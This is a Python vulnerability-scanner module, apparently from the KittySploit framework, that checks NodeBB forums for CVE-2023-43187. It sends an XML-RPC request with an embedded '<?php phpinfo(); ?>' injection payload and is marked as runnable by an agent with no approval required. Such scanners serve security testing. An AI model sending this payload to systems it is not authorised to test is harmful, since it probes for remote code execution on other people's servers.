#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A remote code execution (RCE) vulnerability in the xmlrpc."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NodeBB XML-RPC Request xmlrpc.php - XML Injection Detection',
        'description': 'A remote code execution (RCE) vulnerability in the xmlrpc.php endpoint of NodeBB Inc NodeBB forum software prior to v1.18.6 allows attackers to execute arbitrary code via crafted XML-RPC requests.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'nodebb', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/jagat-singh-chaudhary/CVE/blob/main/CVE-2023-43187',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-43187',
        ],
        'cve': 'CVE-2023-43187',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('nodebb',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/xmlrpc.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml'}, data='<?xml version="1.0"?>\n<methodCall>\n  <methodName>system.listMethods</methodName>\n  <params>\n    <param>\n      <value><?php phpinfo(); ?></value>\n    </param>\n  </params>\n</methodCall>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<title>phpinfo()</title>', 'PHP Version',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='NodeBB XML-RPC Request xmlrpc.php - XML Injection detected', path=path)
            return True
        return False

